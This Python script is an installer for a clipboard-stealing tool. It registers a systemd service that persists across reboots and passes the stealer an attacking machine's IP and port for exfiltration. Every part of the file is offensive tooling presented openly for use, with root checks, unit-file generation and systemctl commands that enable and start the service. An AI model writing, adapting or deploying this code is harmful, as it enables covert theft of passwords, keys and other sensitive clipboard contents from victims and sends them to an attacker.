import os
import shutil
from getpass import getuser
import argparse
import pwd
def setup():
	parser = argparse.ArgumentParser(description="Setup the clipboard stealer service.")
	parser.add_argument("user", type=str, help="Username to steal the clipboard from.")
	parser.add_argument("stealer", type=str, help="File path to the clipboard stealer.")
	parser.add_argument("log", type=str, help="File path to clipboard stealer log file.")
	parser.add_argument("ip", type=str, help="IP address of the attacking machine to connect back to.")
	parser.add_argument("port", type=str, help="Port on the attacking machine to exfiltrate data to.")
	args = parser.parse_args()
	try:
		pwd.getpwnam(args.user)
	except Exception as e:
    		print("Please provide a real user.")
    		exit()
	args.stealer = os.path.abspath(args.stealer)
	args.log = os.path.abspath(args.log)
	if not os.path.exists(args.stealer) or not os.path.exists(args.log):
		print("Please provide the correct path to the stealer and log file.")
		exit()
	if os.geteuid() != 0:
        	print("This script must be run with sudo or as the root user.")
        	exit()
	return args
if __name__ == "__main__":
	try:
		args = setup()
		SCRIPT_PATH = args.stealer
		USERNAME = args.user
		service_file = f"""
		[Unit]
		Description=Clipboard Stealer
		After=network.target

		[Service]
		Type=simple
		Environment=DISPLAY=:0
		ExecStart=/usr/bin/python3 {SCRIPT_PATH} {args.ip} {args.port} {args.log}
		Restart=always
		User={USERNAME}

		[Install]
		WantedBy=multi-user.target
		"""
		service_file_path = f"/usr/lib/systemd/system/clipboardstealer.service"
		with open(service_file_path, "w") as f:
		    f.write(service_file)
		os.system("sudo systemctl daemon-reload")
		os.system("systemctl enable clipboardstealer.service")
		os.system("systemctl start clipboardstealer.service")
		print("The clipboard stealer service has been configured and started.")
	except Exception as e:
		print("The script could not initialize clipboard stealer.")
